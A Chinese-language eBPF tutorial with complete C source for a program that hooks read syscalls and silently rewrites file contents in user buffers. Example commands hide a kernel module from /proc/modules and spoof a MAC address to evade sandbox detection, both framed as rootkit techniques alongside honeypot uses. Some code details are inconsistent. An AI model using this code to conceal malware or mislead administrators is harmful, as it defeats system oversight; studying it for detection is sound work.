# eBPF 教程: 替换任意程序读取或者写入的文本

当你在 Linux 中读取文件时,你相信所看到的内容与磁盘上存储的内容一致。但如果内核本身在对你撒谎呢?本教程演示了 eBPF 程序如何拦截文件读取操作并在应用程序看到文本之前悄悄替换文本——为防御性安全监控和攻击性 rootkit 技术创造了强大的能力。

与在时间戳和审计日志中留下痕迹的传统文件修改不同,这种方法在读取系统调用期间动态操纵数据。磁盘上的文件保持不变,但读取它的每个程序都看到修改后的内容。这种技术在安全研究、蜜罐部署和反恶意软件欺骗中具有合法用途,但也揭示了 rootkit 如何向系统管理员隐藏其存在。

> 完整源代码: <https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/27-replace>

## 用例:从安全到欺骗

文件读取中的文本替换在安全领域的各个方面都有多种用途。对于防御者来说,它可以实现向攻击者呈现虚假凭据的蜜罐系统,或者使恶意软件相信它成功了但实际上没有的欺骗层。安全研究人员使用它通过向可疑进程提供受控数据来研究恶意软件行为。

在攻击方面,rootkit 使用这种确切的技术来隐藏其存在。经典的例子是通过用空格或其他模块名称替换它们在 `/proc/modules` 中的名称来隐藏内核模块,使其不被 `lsmod` 发现。恶意软件可以通过修改从 `/sys/class/net/*/address` 读取的内容来伪造 MAC 地址,击败寻找虚拟机标识符的沙箱检测。

关键洞察是这在系统调用边界上操作——在内核读取文件之后但在用户空间进程看到数据之前。无论你多少次 `cat` 文件或在不同的编辑器中打开它,你总是会看到修改后的版本,因为 eBPF 程序拦截了每个读取操作。

## 架构:多阶段文本扫描和替换

此实现比简单的字符串替换更复杂。挑战在于在 eBPF 的约束内工作:有限的栈大小、没有无界循环和严格的验证器检查。为了处理任意大的文件和多个匹配,程序使用三阶段方法,使用尾调用将 eBPF 程序链接在一起。

第一阶段(`find_possible_addrs`)扫描读取缓冲区,寻找与我们搜索字符串的第一个字符匹配的字符。由于复杂性限制,它还不能进行完整的字符串匹配,所以它只是标记潜在位置。这些地址存储在 `map_name_addrs` 中供下一阶段使用。

第二阶段(`check_possible_addresses`)从第一阶段尾调用。它检查每个潜在匹配位置,并使用 `bpf_strncmp` 进行完整字符串比较。这验证了我们是否真的找到了目标文本。确认的匹配进入 `map_to_replace_addrs`。

第三阶段(`overwrite_addresses`)循环遍历确认的匹配位置,并使用 `bpf_probe_write_user` 用替换字符串覆盖文本。因为两个字符串必须具有相同的长度(以避免移动内存和损坏缓冲区),用户必须填充其替换文本以匹配。

此流水线通过将工作拆分到多个程序中来处理验证器的复杂性限制,每个程序都保持在指令计数阈值之下。尾调用提供了粘合剂,允许一个程序将控制传递给具有相同上下文的下一个程序。

## 实现细节

让我们检查实现此三阶段流水线的完整 eBPF 代码:

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "replace.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// 环形缓冲区映射,用于从内核向用户传递消息
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// 保存来自 'openat' 调用的文件描述符的映射
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// 保存来自 'read' 调用的缓冲区地址的映射
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// 保存可能匹配地址的映射
// 注意:这应该是 map-of-maps,顶层键为 pid_tgid,这样我们知道正在查看正确的程序
#define MAX_POSSIBLE_ADDRS 500
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_name_addrs SEC(".maps");
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_to_replace_addrs SEC(".maps");

// 保存用于尾调用的程序的映射
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// 可选的目标父进程 PID
const volatile int target_ppid = 0;

// 这些存储要替换文本的文件名
const volatile int filename_len = 0;
const volatile char filename[50];

// 这些存储要在文件中查找和替换的文本
const volatile  unsigned int text_len = 0;
const volatile char text_find[FILENAME_LEN_MAX];
const volatile char text_replace[FILENAME_LEN_MAX];

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // 检查我们是否是感兴趣的进程线程
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // 关闭文件,从所有映射中删除 fd 以清理
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // 检查我们是否是感兴趣的进程线程
    // 如果 target_ppid 为 0,则我们针对所有 pid
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // 从参数获取文件名
    char check_filename[FILENAME_LEN_MAX];
    bpf_probe_read_user(&check_filename, filename_len, (char*)ctx->args[1]);

    // 检查文件名是否为我们的目标
    for (int i = 0; i < filename_len; i++) {
        if (filename[i] != check_filename[i]) {
            return 0;
        }
    }

    // 为 sys_exit 调用将 pid_tgid 添加到映射
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    bpf_printk("[TEXT_REPLACE] PID %d Filename %s\n", pid, filename);
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // 将映射值设置为返回的文件描述符
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // 检查这是否是正确的文件描述符
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // 从参数中存储缓冲区地址到映射
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // 记录并退出
    size_t buff_size = (size_t)ctx->args[2];
    bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_addr 0x%lx\n", pid, fd, buff_addr);
    bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_size %lu\n", pid, fd, buff_size);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int find_possible_addrs(struct trace_event_raw_sys_exit *ctx)
{
    // 检查此 open 调用是否正在读取我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int buff_addr = *pbuff_addr;
    long unsigned int name_addr = 0;
    if (buff_addr <= 0) {
        return 0;
    }

    // 这是从 read 系统调用返回的数据量
    if (ctx->ret <= 0) {
        return 0;
    }
    long int buff_size = ctx->ret;
    unsigned long int read_size = buff_size;

    bpf_printk("[TEXT_REPLACE] PID %d | read_size %lu | buff_addr 0x%lx\n", pid, read_size, buff_addr);
    // 64 可能对循环来说太大了
    char local_buff[LOCAL_BUFF_SIZE] = { 0x00 };

    if (read_size > (LOCAL_BUFF_SIZE+1)) {
        // 需要循环 :-(
        read_size = LOCAL_BUFF_SIZE;
    }

    // 以块的方式读取返回的数据,并记录我们要查找的文本的
    // 第一个字符的每个实例。
    // 这一切都非常复杂,但需要保持程序复杂性和大小
    // 足够低以通过验证器检查
    unsigned int tofind_counter = 0;
    for (unsigned int i = 0; i < loop_size; i++) {
        // 从缓冲区以块的方式读取
        bpf_probe_read(&local_buff, read_size, (void*)buff_addr);
        for (unsigned int j = 0; j < LOCAL_BUFF_SIZE; j++) {
            // 查找我们要查找的文本的第一个字符
            if (local_buff[j] == text_find[0]) {
                name_addr = buff_addr+j;
                // 这可能是我们的文本,将地址添加到映射
                // 以便由程序 'check_possible_addrs' 检查
                bpf_map_update_elem(&map_name_addrs, &tofind_counter, &name_addr, BPF_ANY);
                tofind_counter++;
            }
        }

        buff_addr += LOCAL_BUFF_SIZE;
    }

    // 尾调用到 'check_possible_addrs' 以循环遍历可能的地址
    bpf_printk("[TEXT_REPLACE] PID %d | tofind_counter %d \n", pid, tofind_counter);

    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int check_possible_addresses(struct trace_event_raw_sys_exit *ctx) {
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int newline_counter = 0;
    unsigned int match_counter = 0;

    char name[text_len_max+1];
    unsigned int j = 0;
    char old = 0;
    const unsigned int name_len = text_len;
    if (name_len < 0) {
        return 0;
    }
    if (name_len > text_len_max) {
        return 0;
    }
    // 遍历每个可能的位置
    // 并检查它是否真的匹配我们的文本
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        newline_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }
        bpf_probe_read_user(&name, text_len_max, (char*)name_addr);
        // 我们可以在这里使用 bpf_strncmp,
        // 但它在 5.17 之前的内核版本中不可用
        if (bpf_strncmp(name, text_len_max, (const char *)text_find) == 0) {
            // ***********
            // 我们找到了我们的文本!
            // 将位置添加到映射以覆盖
            // ***********
            bpf_map_update_elem(&map_to_replace_addrs, &match_counter, &name_addr, BPF_ANY);
            match_counter++;
        }
        bpf_map_delete_elem(&map_name_addrs, &newline_counter);
    }

    // 如果我们至少找到一个匹配,跳转到程序覆盖文本
    if (match_counter > 0) {
        bpf_tail_call(ctx, &map_prog_array, PROG_02);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int overwrite_addresses(struct trace_event_raw_sys_exit *ctx) {
    // 检查此 open 调用是否正在打开我们的目标文件
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int match_counter = 0;

    // 循环遍历每个要替换文本的地址
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        match_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs, &match_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }

        // 尝试用我们的替换字符串覆盖数据(减去结束的空字节)
        long ret = bpf_probe_write_user((void*)name_addr, (void*)text_replace, text_len);
        // 发送事件
        struct event *e;
        e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
        if (e) {
            e->success = (ret == 0);
            e->pid = pid;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }
        bpf_printk("[TEXT_REPLACE] PID %d | [*] replaced: %s\n", pid, text_find);

        // 完成后清理映射
        bpf_map_delete_elem(&map_to_replace_addrs, &match_counter);
    }

    return 0;
}
```

程序从跟踪文件打开的熟悉模式开始。当进程打开我们的目标文件(通过 `filename` 常量指定)时,我们在 `map_fds` 中记录其文件描述符。这让我们稍后识别来自该特定文件的读取。

有趣的部分从 `handle_read_enter` 开始,我们捕获用户空间传递给 `read()` 系统调用的缓冲区地址。这个地址是内核将写入文件内容的地方,至关重要的是,它也是我们可以在用户空间进程查看数据之前修改它们的地方。

主要逻辑位于 `find_possible_addrs` 中,附加到 `sys_exit_read`。在内核完成读取操作后,我们扫描缓冲区寻找潜在匹配。这里的约束是我们不能做无界循环——验证器会拒绝它。所以我们以 `LOCAL_BUFF_SIZE` 字节的块读取并扫描搜索字符串的第一个字符。每个潜在匹配地址进入 `map_name_addrs`。

一旦我们扫描了缓冲区,我们使用尾调用跳转到 `check_possible_addresses`。此程序遍历潜在匹配并使用 `bpf_strncmp`(在内核 5.17+ 中可用)进行完整字符串比较。确认的匹配移动到 `map_to_replace_addrs`。如果我们找到任何匹配,我们再次尾调用到 `overwrite_addresses`。

最后阶段 `overwrite_addresses` 使用 `bpf_probe_write_user` 执行实际修改。它循环遍历确认的匹配位置并用替换文本覆盖每一个。两个字符串具有相同长度的要求防止了缓冲区损坏——我们在不移动任何内存的情况下进行就地替换。

## 尾调用和验证器约束

尾调用(`bpf_tail_call`)的使用在这里至关重要。eBPF 程序面临严格的复杂性限制——验证器分析每个可能的执行路径以确保程序终止且不访问无效内存。执行扫描、匹配和替换的单个程序将超过这些限制。

尾调用提供了一种在绕过累积指令计数的同时链接程序的方法。当 `find_possible_addrs` 调用 `bpf_tail_call(ctx, &map_prog_array, PROG_01)` 时,它实质上是跳转到具有相同上下文的不同程序(`check_possible_addresses`)。当前程序的执行结束,新程序以新的指令计数预算开始。

用户空间加载器必须在附加任何东西之前使用尾调用程序的文件描述符填充 `map_prog_array`。这是在用户空间代码中使用 `bpf_map_update_elem` 完成的,将索引 `PROG_01` 映射到 `check_possible_addresses` 程序,将 `PROG_02` 映射到 `overwrite_addresses`。

这种架构展示了一个关键的 eBPF 开发模式:当你遇到验证器限制时,将逻辑拆分为多个程序并使用尾调用来协调它们。

## 实际示例和安全影响

让我们看看现实世界的用例。隐藏内核模块以避免检测:

```bash
./replace -f /proc/modules -i 'joydev' -r 'cryptd'
```

当任何进程读取 `/proc/modules` 时,他们会在 `joydev` 实际出现的地方看到 `cryptd`。模块仍然加载并运行,但像 `lsmod` 这样的工具无法看到它。这是一种经典的 rootkit 技术。

伪造 MAC 地址以进行反沙箱规避:

```bash
./replace -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'
```

恶意软件经常通过查看 MAC 地址前缀(0x00:15:5d 表示 Hyper-V)来检查虚拟化。通过用零替换实际的 MAC 地址,恶意软件的虚拟化检测失败,使沙箱分析更容易。

防御翻转是将其用于蜜罐系统。你可以在配置文件中呈现虚假凭据,或使恶意软件相信它成功破坏了系统但实际上没有。磁盘上的文件内容保持安全,但读取它的攻击者看到虚假信息。

## 编译和执行

编译程序:

```bash
cd src/27-replace
make
```

使用指定的文件和文本替换运行:

```bash
sudo ./replace --filename /path/to/file --input foo --replace bar
```

`input` 和 `replace` 必须具有相同的长度以避免缓冲区损坏。要在 bash 中包含换行符,使用 `$'\n'`:

```bash
./replace -f /proc/modules -i 'joydev' -r $'aaaa\n'
```

程序透明地拦截指定文件的所有读取并替换匹配的文本。按 Ctrl-C 停止。

## 总结

本教程演示了 eBPF 程序如何拦截文件读取操作并在用户空间看到数据之前修改数据,而不改变实际文件。我们探索了使用尾调用在验证器约束内工作的三阶段架构,使用 `bpf_probe_write_user` 进行内存操纵,以及从 rootkit 技术到防御性蜜罐部署的实际应用。理解这些模式对于攻击性安全研究和构建考虑基于 eBPF 的攻击的检测机制都至关重要。

> 如果你想深入了解 eBPF,请查看我们的教程代码仓库 <https://github.com/eunomia-bpf/bpf-developer-tutorial> 或访问我们的网站 <https://eunomia.dev/tutorials/>。

## 参考资料

- 原始 bad-bpf 项目: <https://github.com/pathtofile/bad-bpf>
- eBPF 尾调用文档: <https://docs.kernel.org/bpf/prog_sk_lookup.html>
- `bpf_probe_write_user` 安全考虑: <https://lwn.net/Articles/695991/>
- BPF 验证器和程序复杂性: <https://www.kernel.org/doc/html/latest/bpf/verifier.html>
